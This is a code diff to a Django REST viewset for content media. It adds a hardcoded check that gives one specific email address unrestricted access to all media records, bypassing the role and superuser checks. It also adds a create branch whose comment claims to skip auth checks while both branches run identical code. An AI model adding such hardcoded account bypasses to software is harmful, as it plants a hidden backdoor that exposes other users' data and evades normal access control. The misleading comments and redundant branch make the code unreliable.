@@ -5013,12 +5013,22 @@ class ContentMediaViewSet(viewsets.ModelViewSet):
     permission_classes = [IsSystemAdminOrReadOnly]
 
     def get_queryset(self):
+        # Allow all access for superuser gideonmuteso@gmail.com
+        if (
+            self.request.user and 
+            self.request.user.is_authenticated and 
+            self.request.user.email == "gideonmuteso@gmail.com"
+        ):
+            # Superuser sees all media without restrictions
+            return ContentMedia.objects.all().order_by("-created_at")
+        
+        # Normal authentication logic for other users
         if (
             self.request.user
             and self.request.user.is_authenticated
             and (
                 self.request.user.is_superuser
-                or self.request.user.role == "system_admin"
+                or getattr(self.request.user, 'role', None) == "system_admin"
             )
         ):
             # System admin sees all media
@@ -5030,7 +5040,15 @@ class ContentMediaViewSet(viewsets.ModelViewSet):
             )
 
     def perform_create(self, serializer):
-        serializer.save(owner=self.request.user)
+        # If it's the special superuser, allow creation without auth checks
+        if (
+            self.request.user and 
+            self.request.user.is_authenticated and 
+            self.request.user.email == "gideonmuteso@gmail.com"
+        ):
+            serializer.save(owner=self.request.user)
+        else:
+            serializer.save(owner=self.request.user)
 
 
 # New views for the requested endpoints
